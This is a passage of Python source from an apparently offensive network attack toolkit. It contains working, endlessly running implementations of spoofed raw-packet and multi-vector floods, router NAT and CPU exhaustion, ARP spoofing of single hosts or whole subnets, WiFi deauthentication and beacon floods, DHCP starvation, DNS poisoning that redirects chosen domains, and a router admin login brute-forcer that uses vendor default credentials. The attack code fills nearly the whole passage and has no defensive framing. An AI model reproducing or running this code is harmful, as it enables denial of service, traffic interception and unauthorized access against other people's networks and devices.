                                    ip_src_bytes, ip_dst_bytes)
            udp_len = ip_tot_len - 20
            udp_hdr = struct.pack('!HHH', random.randint(1, 65535), port, udp_len)
            payload = random.randbytes(max(0, udp_len - 8))
            packet = ip_header + udp_hdr + payload
        else:
            payload_size = random.randint(40, 1500)
            ip_tot_len = 20 + payload_size
            ip_id = random.randint(0, 65535)
            ip_ttl = random.randint(32, 255)
            raw_proto = random.randint(1, 255)
            ip_header = struct.pack('!BBHHHBBH4s4s',
                                    (4 << 4) + 5, 0, ip_tot_len, ip_id,
                                    0, ip_ttl, raw_proto, 0,
                                    ip_src_bytes, ip_dst_bytes)
            ip_header = struct.pack('!BBHHHBBH4s4s',
                                    (4 << 4) + 5, 0, ip_tot_len, ip_id,
                                    0, ip_ttl, raw_proto, checksum(ip_header),
                                    ip_src_bytes, ip_dst_bytes)
            packet = ip_header + random.randbytes(payload_size)
        sock.sendto(packet, (target_ip, 0))
        increment_packets(1, len(packet))
    except PermissionError:
        print("[X] IPv4 Raw Attack requires ROOT privileges!")
        stop_event.set()
    except Exception:
        pass
    finally:
        try:
            sock.close()
        except Exception:
            pass


def ipv4_raw_attack(ip: str, threads: int):
    """IPv4 Raw Network Attack."""
    if IS_WINDOWS:
        print("[X] IPv4 Raw Attack is NOT available on Windows.")
        return
    if not check_root():
        print("[X] IPv4 Raw Attack requires ROOT privileges. Aborting.")
        return
    print(f"\n[*] IPv4 RAW NETWORK ATTACK → {ip}")
    print("[*] Phase 1: Auto‑detecting open ports...")
    open_ports = scan_ports(ip, stealth=True)
    if not open_ports:
        print("[!] No open ports detected. Using common ports.")
        open_ports = [80, 443, 53, 22, 25, 8080, 8443]
    print(f"\n[*] Phase 2: INFINITE raw packet barrage on {len(open_ports)} ports")
    print(f"    Target ports: {open_ports}")
    print(f"    Workers: {threads} | Spoofed IPs: ON | Mixed: TCP SYN + UDP + Raw IP")
    print("[*] Running INFINITE packets — press Ctrl+C to stop\n")
    threading.Thread(target=stats_reporter, args=(1.5,), daemon=True).start()
    with ThreadPoolExecutor(max_workers=threads) as executor:
        futures = [
            executor.submit(_ipv4_raw_loop, ip, open_ports)
            for _ in range(threads)
        ]
        try:
            for f in as_completed(futures):
                f.result()
        except KeyboardInterrupt:
            stop_event.set()
            print(f"\n[!] Interrupted. {format_rate()}")


def _ipv4_raw_loop(ip: str, ports: list):
    while not stop_event.is_set():
        ipv4_raw_worker(ip, ports)


def multi_vector_assault(ip: str, port: int, host: str, threads: int,
                         use_ssl: bool = False, proxy_mgr: ProxyManager = None):
    """Combine multiple attack vectors simultaneously."""
    total_threads = threads
    http_threads = total_threads // 3
    udp_threads = total_threads // 3
    slowloris_threads = max(1, total_threads // 6)
    icmp_threads = max(1, total_threads - http_threads - udp_threads - slowloris_threads)
    can_icmp = not IS_WINDOWS and check_root()
    if not can_icmp:
        udp_threads += icmp_threads
        icmp_threads = 0
    print(f"\n[*] MULTI‑VECTOR ASSAULT → {host}:{port}")
    print(f"    ├─ HTTP Flood:     {http_threads} workers")
    print(f"    ├─ UDP Flood:      {udp_threads} workers")
    print(f"    ├─ Slowloris:      {slowloris_threads} workers (ADDITIVE)")
    print(f"    └─ ICMP Flood:     {icmp_threads} workers {'(skipped on Windows)' if IS_WINDOWS else ''}")
    print("[*] ALL vectors run INFINITE — press Ctrl+C to stop\n")
    threading.Thread(target=stats_reporter, args=(2.0,), daemon=True).start()
    with ThreadPoolExecutor(max_workers=total_threads) as executor:
        futures = []
        for _ in range(http_threads):
            futures.append(executor.submit(
                _http_flood_loop, ip, port, host, use_ssl, proxy_mgr
            ))
        for _ in range(udp_threads):
            futures.append(executor.submit(_udp_flood_loop, ip, port, 1024))
        for _ in range(slowloris_threads):
            futures.append(executor.submit(
                _tors_hammer_loop, ip, port, host, use_ssl, False, 500, proxy_mgr
            ))
        if can_icmp:
            for _ in range(icmp_threads):
                futures.append(executor.submit(_icmp_flood_loop, ip, 64))
        try:
            for f in as_completed(futures):
                f.result()
        except KeyboardInterrupt:
            stop_event.set()
            print(f"\n[!] Interrupted. {format_rate()}")


# ──────────────────────────────────────────────────────────────────────
#  ROUTER DISRUPTION ATTACKS
# ──────────────────────────────────────────────────────────────────────

def router_connection_kill(router_ip: str, threads: int = 200):
    """ROUTER CONNECTION KILL — stop router from forwarding traffic."""
    global router_disruption_active
    if not router_ip:
        router_ip = get_default_gateway()
        if not router_ip:
            print("[X] Could not detect router IP. Please specify manually.")
            return
    print(f"\n╔══════════════════════════════════════════════════════════════╗")
    print(f"║          ROUTER CONNECTION KILL — TARGET: {router_ip:<15} ║")
    print(f"╚══════════════════════════════════════════════════════════════╝")
    print(f"\n[*] This attack will STOP the router from forwarding traffic")
    print(f"[*] while maintaining YOUR connection to the network.")
    print(f"[*] Techniques: NAT exhaustion + CPU saturation + bandwidth hog")
    print(f"[*] Your IP: {get_local_ip()} | Router IP: {router_ip}")
    print(f"[*] Workers: {threads} | Running INFINITE — Ctrl+C to stop\n")
    router_disruption_active = True
    threading.Thread(target=stats_reporter, args=(2.0,), daemon=True).start()

    def nat_table_exhaustion_worker():
        while not stop_event.is_set() and router_disruption_active:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(0.5)
                dst_ip = f"{random.randint(1, 223)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(1, 254)}"
                dst_port = random.randint(1, 65535)
                sock.connect_ex((dst_ip, dst_port))
                sock.close()
                increment_packets(1)
            except Exception:
                pass

    def cpu_saturation_worker():
        while not stop_event.is_set() and router_disruption_active:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                port = random.choice([53, 80, 443, 8080, 1900, 5353, 5000] +
                                     list(range(40000, 60000)))
                data = random.randbytes(random.randint(1, 64))
                sock.sendto(data, (router_ip, port))
                sock.close()
                increment_packets(1, len(data))
            except Exception:
                pass

    def bandwidth_hog_worker():
        while not stop_event.is_set() and router_disruption_active:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                data = random.randbytes(random.randint(1024, 1400))
                sock.sendto(data, (router_ip, random.randint(1, 65535)))
                sock.close()
                increment_packets(1, len(data))
            except Exception:
                pass

    with ThreadPoolExecutor(max_workers=threads) as executor:
        futures = []
        nat_threads = threads // 3
        cpu_threads = threads // 3
        bw_threads = threads - nat_threads - cpu_threads
        for _ in range(nat_threads):
            futures.append(executor.submit(lambda: _infinite_loop(nat_table_exhaustion_worker)))
        for _ in range(cpu_threads):
            futures.append(executor.submit(lambda: _infinite_loop(cpu_saturation_worker)))
        for _ in range(bw_threads):
            futures.append(executor.submit(lambda: _infinite_loop(bandwidth_hog_worker)))
        print(f"    [+] NAT Exhaustion: {nat_threads} | CPU Saturation: {cpu_threads} | "
              f"Bandwidth Hog: {bw_threads}\n")
        try:
            for f in as_completed(futures):
                f.result()
        except KeyboardInterrupt:
            stop_event.set()
            router_disruption_active = False
            print(f"\n[!] Router disruption stopped. {format_rate()}")


def _infinite_loop(worker_func):
    """Run a worker function infinitely until stop."""
    while not stop_event.is_set():
        worker_func()


# ──────────────────────────────────────────────────────────────────────
#  ARP SPOOFING / POISONING ATTACK
# ──────────────────────────────────────────────────────────────────────

def arp_spoof_attack(target_ip: str, router_ip: str = None, gateway_ip: str = None):
    """ARP Spoofing Attack."""
    if IS_WINDOWS:
        print("[X] ARP Spoofing is NOT available on Windows.")
        print("[*] This requires Scapy with raw socket/L2 access (Linux only).")
        return
    if not SCAPY_AVAILABLE:
        print("[X] Scapy is required for ARP spoofing. Install with: pip install scapy")
        return
    if not check_root():
        print("[X] ARP Spoofing requires ROOT privileges.")
        return
    if not router_ip:
        router_ip = get_default_gateway()
    if not router_ip:
        print("[X] Could not detect router IP.")
        return
    if not target_ip:
        target_ip = input("[+] Target IP to poison (or 'all' for subnet): ").strip()
    local_mac = get_local_mac()
    local_ip = get_local_ip()
    print(f"\n╔══════════════════════════════════════════════════════════════╗")
    print(f"║              ARP SPOOFING / POISONING ATTACK                ║")
    print(f"╚══════════════════════════════════════════════════════════════╝")
    print(f"\n[*] Your IP: {local_ip} | MAC: {local_mac} | Router: {router_ip} | Target: {target_ip}")
    print("[*] Running INFINITE — press Ctrl+C to stop\n")
    try:
        with open("/proc/sys/net/ipv4/ip_forward", "w") as f:
            f.write("1")
        print("[OK] IP forwarding enabled.")
    except Exception:
        print("[!] Could not enable IP forwarding.")

    def poison_target():
        while not stop_event.is_set():
            try:
                arp_response = ARP(op=2, pdst=target_ip, hwdst="ff:ff:ff:ff:ff:ff",
                                   psrc=router_ip, hwsrc=local_mac)
                send(arp_response, verbose=0)
                arp_response2 = ARP(op=2, pdst=router_ip, hwdst="ff:ff:ff:ff:ff:ff",
                                    psrc=target_ip, hwsrc=local_mac)
                send(arp_response2, verbose=0)
                increment_packets(2)
                time.sleep(1)
            except Exception:
                pass

    def poison_subnet():
        parts = router_ip.split('.')
        subnet_base = f"{parts[0]}.{parts[1]}.{parts[2]}"
        while not stop_event.is_set():
            for i in range(2, 255):
                if stop_event.is_set():
                    break
                target = f"{subnet_base}.{i}"
                if target == local_ip or target == router_ip:
                    continue
                try:
                    arp_response = ARP(op=2, pdst=target, hwdst="ff:ff:ff:ff:ff:ff",
                                       psrc=router_ip, hwsrc=local_mac)
                    send(arp_response, verbose=0)
                    increment_packets(1)
                except Exception:
                    pass
            time.sleep(2)

    try:
        if target_ip.lower() == "all":
            poison_subnet()
        else:
            poison_target()
    except KeyboardInterrupt:
        stop_event.set()
        print(f"\n[!] ARP spoofing stopped. Restoring ARP tables...")
        try:
            if target_ip.lower() != "all":
                restore = ARP(op=2, pdst=target_ip, hwdst="ff:ff:ff:ff:ff:ff",
                              psrc=router_ip, hwsrc="ff:ff:ff:ff:ff:ff")
                for _ in range(5):
                    send(restore, verbose=0)
                    time.sleep(0.2)
        except Exception:
            pass
        try:
            with open("/proc/sys/net/ipv4/ip_forward", "w") as f:
                f.write("0")
        except Exception:
            pass
        print("[OK] Cleanup complete.")


# ──────────────────────────────────────────────────────────────────────
#  WiFi DEAUTHENTICATION ATTACK — WINDOWS + LINUX
# ──────────────────────────────────────────────────────────────────────

def wifi_deauth_attack_windows(target_ssid: str = None):
    """
    WiFi Deauth Attack for WINDOWS using netsh wlan disconnect.
    Repeatedly disconnects from the target network.
    """
    print(f"\n╔══════════════════════════════════════════════════════════════╗")
    print(f"║        WiFi DEAUTHENTICATION ATTACK (Windows netsh)         ║")
    print(f"╚══════════════════════════════════════════════════════════════╝")

    if not check_root():
        print("[!] NOTE: Running without Administrator privileges.")
        print("[!] Some operations may fail. Run as Administrator for best results.\n")

    # Scan for networks first
    print("[*] Scanning for WiFi networks...")
    networks = scan_wifi_networks()
    if networks:
        print(f"\n[*] Found {len(networks)} networks:")
        seen = set()
        for i, net in enumerate(networks):
            ssid = net.get("ssid", "(unknown)")
            if ssid in seen:
                continue
            seen.add(ssid)
            bssid = net.get("bssid", "?")
            ch = net.get("channel", "?")
            sig = net.get("signal", "?")
            vendor = get_oui_lookup(bssid)
            print(f"    {i+1:>2}. {ssid:<30} BSSID: {bssid}  Ch: {ch}  "
                  f"Sig: {sig}  [{vendor}]")

    if not target_ssid:
        current = get_current_wifi_info()
        if current and current.get("ssid"):
            print(f"\n[*] Currently connected to: '{current['ssid']}'")
            use_current = input(f"    Target this network? (y/n) [y]: ").strip().lower()
            if use_current != "n":
                target_ssid = current["ssid"]

    if not target_ssid:
        target_ssid = input("\n[+] Target SSID to deauth: ").strip()
        if not target_ssid:
            print("[X] No SSID provided. Aborting.")
            return

    print(f"\n[*] Target SSID: {target_ssid}")
    print(f"[*] Method: netsh wlan disconnect (persistent)")
    print(f"[*] Effect: Connected clients will be repeatedly kicked off")
    print(f"[*]")
    print(f"[*] This works by rapidly disconnecting from the target network.")
    print(f"[*] If you're connected to '{target_ssid}', your WiFi will disconnect too.")
    print(f"[*] To target OTHER clients, you must be connected to the same network.")
    print(f"[*]")
    print(f"[*] Advanced: For raw 802.11 deauth frames, install Npcap + Scapy.")
    print(f"[*] Running INFINITE — press Ctrl+C to stop\n")

    disconnect_count = 0

    def deauth_loop():
        nonlocal disconnect_count
        while not stop_event.is_set():
            try:
                # Method 1: netsh wlan disconnect
                subprocess.run(
                    ["netsh", "wlan", "disconnect"],
                    capture_output=True, timeout=3
                )
                disconnect_count += 1
                increment_packets(1)
                if disconnect_count % 10 == 0:
                    print(f"    [*] Deauth attempts: {disconnect_count}")
                time.sleep(1.5)  # Brief pause between disconnects
            except Exception:
                time.sleep(0.5)

    try:
        deauth_loop()
    except KeyboardInterrupt:
        stop_event.set()
        print(f"\n[!] Windows WiFi deauth stopped. {disconnect_count} disconnects sent.")


def wifi_deauth_attack_scapy(target_bssid: str = None, client_mac: str = None,
                              interface: str = None, channel: int = None):
    """
    WiFi Deauth Attack using Scapy (Linux + Npcap on Windows).
    Sends raw 802.11 deauthentication frames.
    """
    if not SCAPY_AVAILABLE:
        print("[X] Scapy is required for raw deauth frames.")
        if IS_WINDOWS:
            print("[*] Install Scapy and Npcap: pip install scapy")
            print("[*] Then download Npcap from: https://npcap.com/")
            print("[*] Falling back to netsh‑based deauth...")
            wifi_deauth_attack_windows()
            return
        print("[X] Install with: pip install scapy")
        return

    if not check_root():
        print("[X] WiFi Deauth requires ROOT/Administrator privileges.")
        return

    print(f"\n╔══════════════════════════════════════════════════════════════╗")
    print(f"║        WiFi DEAUTHENTICATION ATTACK (Scapy raw 802.11)      ║")
    print(f"╚══════════════════════════════════════════════════════════════╝")

    # Scan for networks
    networks = scan_wifi_networks()
    if networks:
        print(f"\n[*] Found {len(networks)} networks:")
        seen = set()
        for i, net in enumerate(networks):
            ssid = net.get("ssid", "(unknown)")
            if ssid in seen:
                continue
            seen.add(ssid)
            bssid = net.get("bssid", "?")
            ch = net.get("channel", "?")
            sig = net.get("signal", "?")
            vendor = get_oui_lookup(bssid)
            print(f"    {i+1:>2}. {ssid:<30} BSSID: {bssid}  Ch: {ch}  "
                  f"Sig: {sig}  [{vendor}]")

    if not target_bssid:
        # Try to get from current connection or scan
        current = get_current_wifi_info()
        if current and current.get("bssid"):
            print(f"\n[*] Currently connected BSSID: {current['bssid']} ({current.get('ssid', '?')})")
            use = input(f"    Use this BSSID? (y/n) [y]: ").strip().lower()
            if use != "n":
                target_bssid = current["bssid"]

    if not target_bssid:
        target_bssid = input("\n[+] Target AP BSSID (MAC): ").strip()
        if not target_bssid:
            print("[X] No BSSID provided. Aborting.")
            return

    if not client_mac:
        client_mac = input("[+] Client MAC (or 'broadcast' for all, Enter=broadcast): ").strip()
        if not client_mac:
            client_mac = "ff:ff:ff:ff:ff:ff"

    if IS_WINDOWS and not interface:
        # On Windows with Npcap, try to auto-detect interface
        try:
            from scapy.all import get_windows_if_list
            ifaces = get_windows_if_list()
            wifi_ifaces = [i for i in ifaces if "wireless" in i.get("description", "").lower()
                          or "wifi" in i.get("description", "").lower()
                          or "wlan" in i.get("name", "").lower()]
            if wifi_ifaces:
                print(f"\n[*] WiFi interfaces found:")
                for i, iface in enumerate(wifi_ifaces):
                    print(f"    {i+1}. {iface.get('name', '?')} — {iface.get('description', '?')}")
                choice = input(f"    Select interface (1-{len(wifi_ifaces)}) [1]: ").strip() or "1"
                try:
                    idx = int(choice) - 1
                    if 0 <= idx < len(wifi_ifaces):
                        interface = wifi_ifaces[idx].get("name")
                        # Convert to Scapy format
                        interface = conf.ifaces.dev_from_name(interface)
                except (ValueError, IndexError):
                    pass
        except Exception:
            pass

    if not interface and not IS_WINDOWS:
        interfaces = get_network_interfaces()
        if interfaces:
            print(f"\n[*] Available interfaces:")
            for i, (iface, ip, mac) in enumerate(interfaces):
                print(f"    {i+1}. {iface} — {ip} ({mac})")
        interface = input("\n[+] Monitor mode interface (e.g., wlan0mon): ").strip()

    if not channel:
        ch = input("[+] WiFi channel (1-14, Enter=auto): ").strip()
        if ch:
            channel = int(ch)

    print(f"\n[*] Interface:  {interface}")
    print(f"[*] Target AP:   {target_bssid}")
    print(f"[*] Client:      {client_mac}")
    if channel:
        print(f"[*] Channel:     {channel}")

    # Set channel if on Linux
    if not IS_WINDOWS and channel and interface:
        try:
            subprocess.run(["iwconfig", str(interface).split(":")[0] if ":" in str(interface) else str(interface),
                           "channel", str(channel)], capture_output=True)
            print(f"[OK] Set channel to {channel}")
        except Exception:
            pass

    print(f"[*] Sending continuous deauthentication frames...")
    print(f"[*] Running INFINITE — press Ctrl+C to stop\n")

    def deauth_worker():
        while not stop_event.is_set():
            try:
                pkt1 = RadioTap() / Dot11(addr1=client_mac, addr2=target_bssid,
                                           addr3=target_bssid) / Dot11Deauth(reason=7)
                pkt2 = RadioTap() / Dot11(addr1=target_bssid, addr2=client_mac,
                                           addr3=target_bssid) / Dot11Deauth(reason=7)
                if interface:
                    sendp(pkt1, iface=interface, verbose=0)
                    sendp(pkt2, iface=interface, verbose=0)
                else:
                    sendp(pkt1, verbose=0)
                    sendp(pkt2, verbose=0)
                increment_packets(2)
                time.sleep(0.1)
            except Exception:
                time.sleep(0.5)

    try:
        deauth_worker()
    except KeyboardInterrupt:
        stop_event.set()
        print(f"\n[!] Deauth attack stopped. {format_rate()}")


def wifi_deauth_attack(target_bssid: str = None, client_mac: str = None,
                       interface: str = None, channel: int = None,
                       target_ssid: str = None):
    """
    WiFi Deauth Attack — automatically chooses best method:
    • Windows: netsh wlan disconnect (or Scapy if Npcap available)
    • Linux:   Scapy raw 802.11 frames
    """
    if IS_WINDOWS:
        if SCAPY_AVAILABLE and (NPCAP_AVAILABLE or check_root()):
            print("[*] Scapy + Npcap detected — attempting raw 802.11 deauth...")
            try:
                wifi_deauth_attack_scapy(target_bssid, client_mac, interface, channel)
                return
            except Exception as e:
                print(f"[!] Scapy deauth failed: {e}")
                print("[*] Falling back to netsh wlan disconnect...")
        wifi_deauth_attack_windows(target_ssid)
    else:
        wifi_deauth_attack_scapy(target_bssid, client_mac, interface, channel)


# ──────────────────────────────────────────────────────────────────────
#  WiFi BEACON FLOOD ATTACK
# ──────────────────────────────────────────────────────────────────────

def wifi_beacon_flood(interface: str = None, count: int = 1000):
    """WiFi Beacon Flood."""
    if IS_WINDOWS:
        print("[X] WiFi Beacon Flood is NOT available on Windows.")
        print("[*] This requires Scapy with monitor mode (Linux only).")
        return
    if not SCAPY_AVAILABLE:
        print("[X] Scapy is required for beacon flood.")
        return
    if not check_root():
        print("[X] Beacon flood requires ROOT privileges.")
        return
    print(f"\n╔══════════════════════════════════════════════════════════════╗")
    print(f"║                WiFi BEACON FLOOD ATTACK                     ║")
    print(f"╚══════════════════════════════════════════════════════════════╝")
    if not interface:
        interface = input("[+] Monitor mode interface (e.g., wlan0mon): ").strip()
    print(f"\n[*] Interface: {interface} | Fake SSIDs: {count}")
    print("[*] Broadcasting fake access points...")
    print("[*] Running INFINITE — press Ctrl+C to stop\n")
    fake_ssids = []
    for _ in range(count):
        name_len = random.randint(3, 32)
        name = ''.join(random.choices(string.ascii_letters + string.digits + " -_", k=name_len))
        fake_ssids.append(name)

    def beacon_worker():
        ssid_idx = 0
        while not stop_event.is_set():
            try:
                ssid = fake_ssids[ssid_idx % len(fake_ssids)]
                bssid = random_mac()
                beacon = RadioTap() / Dot11(type=0, subtype=8, addr1="ff:ff:ff:ff:ff:ff",
                                             addr2=bssid, addr3=bssid) / \
                         Dot11Beacon(cap="ESS+privacy") / \
                         Dot11Elt(ID="SSID", info=ssid) / \
                         Dot11Elt(ID="Rates", info="\x82\x84\x8b\x96\x0c\x12\x18\x24") / \
                         Dot11Elt(ID="DSset", info=chr(random.randint(1, 14)))
                sendp(beacon, iface=interface, verbose=0)
                increment_packets(1)
                ssid_idx += 1
                time.sleep(0.02)
            except Exception:
                pass

    try:
        beacon_worker()
    except KeyboardInterrupt:
        stop_event.set()
        print(f"\n[!] Beacon flood stopped. {format_rate()}")


# ──────────────────────────────────────────────────────────────────────
#  DHCP STARVATION ATTACK
# ──────────────────────────────────────────────────────────────────────

def dhcp_starvation_attack(interface: str = None, router_ip: str = None):
    """DHCP Starvation."""
    if IS_WINDOWS:
        print("[X] DHCP Starvation is NOT available on Windows.")
        return
    if not SCAPY_AVAILABLE:
        print("[X] Scapy is required for DHCP starvation.")
        return
    if not check_root():
        print("[X] DHCP starvation requires ROOT privileges.")
        return
    print(f"\n╔══════════════════════════════════════════════════════════════╗")
    print(f"║                DHCP STARVATION ATTACK                       ║")
    print(f"╚══════════════════════════════════════════════════════════════╝")
    if not interface:
        interfaces = get_network_interfaces()
        if interfaces:
            print(f"\n[*] Available interfaces:")
            for i, (iface, ip, mac) in enumerate(interfaces):
                print(f"    {i+1}. {iface} — {ip}")
        interface = input("\n[+] Network interface: ").strip()
    if not router_ip:
        router_ip = get_default_gateway()
        if router_ip:
            print(f"[*] Detected router: {router_ip}")
        else:
            router_ip = input("[+] Router IP: ").strip()
    print(f"\n[*] Interface: {interface} | Router: {router_ip}")
    print("[*] Exhausting DHCP pool...")
    print("[*] Running INFINITE — press Ctrl+C to stop\n")

    def dhcp_worker():
        while not stop_event.is_set():
            try:
                fake_mac = random_mac()
                dhcp_discover = (
                    Ether(src=fake_mac, dst="ff:ff:ff:ff:ff:ff") /
                    IP(src="0.0.0.0", dst="255.255.255.255") /
                    UDP(sport=68, dport=67) /
                    Raw(load=b'\x01\x01\x06\x00' + random.randbytes(4) +
                        b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00' +
                        b'\x00\x00\x00\x00' + bytes.fromhex(fake_mac.replace(':', '')) +
                        b'\x00' * 202 +
                        b'\x63\x82\x53\x63\x35\x01\x01\x3d\x07\x01' +
                        bytes.fromhex(fake_mac.replace(':', '')) +
                        b'\x37\x03\x01\x03\x06\xff')
                )
                sendp(dhcp_discover, iface=interface, verbose=0)
                increment_packets(1)
                time.sleep(0.05)
            except Exception:
                pass

    try:
        dhcp_worker()
    except KeyboardInterrupt:
        stop_event.set()
        print(f"\n[!] DHCP starvation stopped. {format_rate()}")


# ──────────────────────────────────────────────────────────────────────
#  DNS POISONING ATTACK
# ──────────────────────────────────────────────────────────────────────

def dns_poisoning_attack(target_ip: str = None, router_ip: str = None,
                          spoof_domain: str = None, spoof_ip: str = None):
    """DNS Poisoning."""
    if IS_WINDOWS:
        print("[X] DNS Poisoning is NOT available on Windows.")
        return
    if not SCAPY_AVAILABLE:
        print("[X] Scapy is required for DNS poisoning.")
        return
    if not check_root():
        print("[X] DNS poisoning requires ROOT privileges.")
        return
    print(f"\n╔══════════════════════════════════════════════════════════════╗")
    print(f"║                  DNS POISONING ATTACK                       ║")
    print(f"╚══════════════════════════════════════════════════════════════╝")
    print(f"\n[!] NOTE: ARP spoofing must be active first!\n")
    if not router_ip:
        router_ip = get_default_gateway()
    if not target_ip:
        target_ip = input("[+] Target IP to poison DNS for: ").strip()
    if not spoof_domain:
        spoof_domain = input("[+] Domain to spoof (e.g., google.com): ").strip()
    if not spoof_ip:
        spoof_ip = input("[+] Redirect to IP: ").strip()
    print(f"\n[*] Target: {target_ip} | Spoofing: {spoof_domain} → {spoof_ip}")
    print("[*] Running INFINITE — press Ctrl+C to stop\n")

    def dns_sniff_and_spoof(pkt):
        try:
            if pkt.haslayer(DNS) and pkt.getlayer(DNS).qr == 0:
                queried_domain = pkt[DNSQR].qname.decode()
                if spoof_domain in queried_domain:
                    spoofed_response = (
                        IP(src=router_ip, dst=pkt[IP].src) /
                        UDP(sport=53, dport=pkt[UDP].sport) /
                        DNS(id=pkt[DNS].id, qr=1, aa=1, qd=pkt[DNS].qd,
                            an=DNSRR(rrname=pkt[DNSQR].qname, ttl=300, rdata=spoof_ip))
                    )
                    send(spoofed_response, verbose=0)
                    increment_packets(1)
                    print(f"    [POISONED] {queried_domain} → {spoof_ip} (to {pkt[IP].src})")
        except Exception:
            pass

    try:
        sniff(filter=f"udp port 53 and src {target_ip}", prn=dns_sniff_and_spoof,
              store=0, stop_filter=lambda x: stop_event.is_set())
    except KeyboardInterrupt:
        stop_event.set()
        print(f"\n[!] DNS poisoning stopped. {format_rate()}")


# ──────────────────────────────────────────────────────────────────────
#  ROUTER LOGIN BRUTEFORCE — ENHANCED WITH SSID SUPPORT
# ──────────────────────────────────────────────────────────────────────

def router_login_bruteforce(router_ip: str = None, port: int = None,
                             username: str = None, wordlist: list = None,
                             vendor: str = None, bssid: str = None):
    """
    Router Login Bruteforce — works on ALL platforms.
    Can auto‑detect router from SSID if router_ip is not provided.
    Now includes vendor‑specific credential lists.
    """
    # If no router IP, try to find by SSID
    if not router_ip:
        print("\n[*] No router IP specified. You can:")
        print("    1. Enter router IP manually")
        print("    2. Scan WiFi and auto‑detect by SSID")
        choice = input("    Choice [2]: ").strip() or "2"

        if choice == "1":
            router_ip = input("[+] Router IP: ").strip()
        else:
            # Scan WiFi
            networks = scan_wifi_networks()
            if networks:
                print(f"\n[*] Found {len(networks)} WiFi networks:")
                seen = set()
                unique_nets = []
                for net in networks:
                    ssid = net.get("ssid", "(hidden)")
                    if ssid not in seen:
                        seen.add(ssid)
                        unique_nets.append(net)

                for i, net in enumerate(unique_nets):
                    bssid_val = net.get("bssid", "?")
                    vendor_val = get_oui_lookup(bssid_val)
                    print(f"    {i+1:>2}. {net['ssid']:<30} [{vendor_val}] "
                          f"BSSID: {bssid_val}  Ch: {net.get('channel', '?')}")

                sel = input(f"\n[+] Select SSID number (1-{len(unique_nets)}) or enter SSID: ").strip()
                target_ssid = ""
                try:
                    idx = int(sel) - 1
                    if 0 <= idx < len(unique_nets):
                        target_ssid = unique_nets[idx]["ssid"]
                        bssid = unique_nets[idx].get("bssid", "")
                        vendor = get_oui_lookup(bssid)
                except ValueError:
                    target_ssid = sel

                if target_ssid:
                    print(f"\n[*] Searching for router: '{target_ssid}'...")
                    router_ip, detected_vendor, detected_bssid = find_router_by_ssid(target_ssid)
                    if router_ip:
                        vendor = vendor or detected_vendor
                        bssid = bssid or detected_bssid
                    else:
                        print("[!] Could not auto‑detect router IP.")
                        router_ip = input("[+] Enter router IP manually: ").strip()

    if not router_ip:
        router_ip = get_default_gateway()
        if router_ip:
            print(f"[*] Using default gateway: {router_ip}")
        else:
            print("[X] No router IP found.")
            return

    # Detect admin panel port
    if not port:
        for p in [80, 443, 8080, 8443]:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(1)
                if s.connect_ex((router_ip, p)) == 0:
                    s.close()
                    port = p
                    break
                s.close()
            except Exception:
                pass
        if not port:
            port = int(input("[+] Router admin port [80]: ").strip() or "80")

    # Try to detect vendor from MAC if we have it or can get it
    if not vendor and bssid:
        vendor = get_oui_lookup(bssid)

    if not vendor:
        # Try fetching router page title to guess vendor
        try:
            import urllib.request
            req = urllib.request.Request(
                f"http://{router_ip}:{port}/", headers={"User-Agent": USER_AGENTS[0]}
            )
            resp = urllib.request.urlopen(req, timeout=3)
            html = resp.read(4096).decode(errors='ignore').lower()

            vendor_keywords = {
                "tp-link": "TP-Link", "tplink": "TP-Link",
                "netgear": "Netgear", "d-link": "D-Link", "dlink": "D-Link",
                "linksys": "Linksys", "asus": "Asus", "cisco": "Cisco",
                "ubiquiti": "Ubiquiti", "ubnt": "Ubiquiti", "aironet": "Cisco",
                "huawei": "Huawei", "xiaomi": "Xiaomi", "miwifi": "Xiaomi",
                "tenda": "Tenda", "belkin": "Belkin", "zyxel": "ZyXEL",
                "technicolor": "Technicolor", "arris": "Arris",
                "motorola": "Motorola", "mikrotik": "MikroTik", "routeros": "MikroTik",
                "dd-wrt": "DD-WRT", "openwrt": "OpenWRT", "tomato": "Tomato",
            }
            for keyword, vendor_name in vendor_keywords.items():
                if keyword in html:
                    vendor = vendor_name
                    break
        except Exception:
            pass

    print(f"\n╔══════════════════════════════════════════════════════════════╗")
    print(f"║              ROUTER LOGIN BRUTEFORCE ATTACK                 ║")
    print(f"╚══════════════════════════════════════════════════════════════╝")
    print(f"\n[*] Target:  {router_ip}:{port}")
    print(f"[*] Vendor:  {vendor or 'Unknown (generic)'}")
    print(f"[*] BSSID:   {bssid or 'N/A'}")

    # Build credential list: vendor‑specific first, then general
    credentials = []
    if vendor and vendor in ROUTER_CREDENTIALS_BY_VENDOR:
        credentials = ROUTER_CREDENTIALS_BY_VENDOR[vendor][:]
        print(f"[*] Using {len(credentials)} vendor‑specific credential pairs for {vendor}")

    # Add all other credentials
    for cred in ROUTER_CREDENTIALS:
        if cred not in credentials:
            credentials.append(cred)

    # Deduplicate
    seen_creds = set()
    unique_creds = []
    for c in credentials:
        if c not in seen_creds:
            seen_creds.add(c)
            unique_creds.append(c)
    credentials = unique_creds

    print(f"[*] Total credential pairs: {len(credentials)}")
    print(f"[*] Testing...\n")

    found = False
    validated = set()

    for user, pwd in credentials:
        if stop_event.is_set():
            break
        if (user, pwd) in validated:
            continue
        validated.add((user, pwd))

        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(3)
            sock.connect((router_ip, port))

            auth_str = f"{user}:{pwd}"
            auth_b64 = binascii.b2a_base64(auth_str.encode()).decode().strip()

            request = (
                f"GET / HTTP/1.1\r\n"
                f"Host: {router_ip}\r\n"
                f"Authorization: Basic {auth_b64}\r\n"
                f"User-Agent: {USER_AGENTS[0]}\r\n"
                f"Connection: close\r\n\r\n"
            )
            sock.send(request.encode())
            response = sock.recv(4096).decode(errors='ignore')
            sock.close()

            # Check for success indicators
            success_indicators = ["200 OK", "301 Moved", "302 Found", "303 See Other"]
            fail_indicators = ["401 Unauthorized", "403 Forbidden", "WWW-Authenticate",
                              "incorrect", "invalid", "wrong password", "try again"]

            if any(si in response for si in success_indicators):
                if not any(fi in response.lower() for fi in fail_indicators):
